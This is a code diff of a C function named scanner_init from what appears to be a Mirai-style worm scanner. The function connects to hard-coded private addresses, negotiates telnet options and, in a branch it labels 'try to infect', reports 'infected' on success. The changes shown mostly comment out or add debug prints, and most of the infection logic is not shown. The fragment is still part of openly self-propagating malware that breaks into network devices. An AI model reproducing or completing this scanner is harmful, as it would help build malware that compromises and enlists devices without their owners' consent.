@@ -87,6 +87,7 @@ int scanner_init(void) {
  	switch(add){
  		case 1: 
  			server.sin_addr.s_addr = inet_addr("10.1.1.11");
+ 			
  			break;
  		case 2:
  			server.sin_addr.s_addr = inet_addr("10.1.1.12");
@@ -124,7 +125,7 @@ int scanner_init(void) {
  
         // wait for data
         int nready = select(sock + 1, &fds, (fd_set *) 0, (fd_set *) 0, &ts);
-        puts("Connected1...\n");
+        //puts("Connected1...\n");
         if (nready < 0) {
             perror("select. Error");
             close(sock);
@@ -133,9 +134,10 @@ int scanner_init(void) {
         else if (nready == 0) {
             ts.tv_sec = 1; // 1 second
             ts.tv_usec = 0;
-            puts("no ready\n");
             timeout = timeout + 1;
+            //puts("no select\n");
             if(timeout == 10){
+            	puts("timeout on socket\n");
             	close(sock);
             	break;
             }
@@ -143,7 +145,7 @@ int scanner_init(void) {
         }
         else if (sock != 0 && FD_ISSET(sock, &fds)) {
             // start by reading a single byte
-            puts("Connected2...\n");
+            //puts("Connected2...\n");
             int rv;
             if ((rv = recv(sock , buf , 1 , 0)) < 0){
             	close(sock);
@@ -155,7 +157,7 @@ int scanner_init(void) {
             }
  
             if (buf[0] == CMD) {
-            	puts("Connected3...\n");
+            	//puts("Connected3...\n");
                 // read 2 more bytes
                 len = recv(sock , buf + 1 , 2 , 0);
                 if (len  < 0){
@@ -167,9 +169,10 @@ int scanner_init(void) {
                     break;
                 }
                 negotiate(sock, buf, 3);
-                puts("Connected3...\n");
+                //puts("Connected3...\n");
             }
             else {
+            	//puts("try to infect\n");
                 len = 1;
                 buf[len] = '\0';
                 if(strcmp(":",buf) == 0 && ro<2){
@@ -217,13 +220,14 @@ int scanner_init(void) {
                 		close(sock);
                 		break;
                 	}
+                	puts("infected\n");
                 	sleep(1);
                 	close(sock);
                 	break;
 
                 	inf = inf + 1;
                 }
-                printf("%s", buf);
+                //printf("%s", buf);
                 fflush(0);
             }
         }
